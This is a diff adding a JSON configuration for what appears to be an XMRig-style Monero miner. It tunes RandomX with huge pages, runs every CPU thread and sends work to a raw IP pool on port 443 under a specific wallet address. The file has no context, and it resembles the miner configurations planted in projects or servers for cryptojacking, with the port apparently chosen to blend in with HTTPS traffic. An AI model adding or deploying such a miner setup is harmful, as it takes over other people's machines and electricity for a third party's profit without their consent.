@@ -1,0 +1,21 @@
+{
+    "autosave": true,
+    "randomx": {
+        "1gb-pages": true
+    },
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "rx/0": [-1, -1, -1, -1,-1, -1, -1, -1]
+},
+    "pools": [
+        {
+            "algo": "null",
+            "coin": null,
+            "url": "157.20.104.252:443",
+            "user": "8BcWKM2iXwPHynNzKT1QV94R8rTry9idTPvonMvFaKPydhzREGnHS9hFqJ5gAXTaJBBbB4g422H1dW9J7hMXv16qTbBBLDE",
+            "pass": "MEMEK",
+            "keepalive": true,
+        }
+    ],
+}
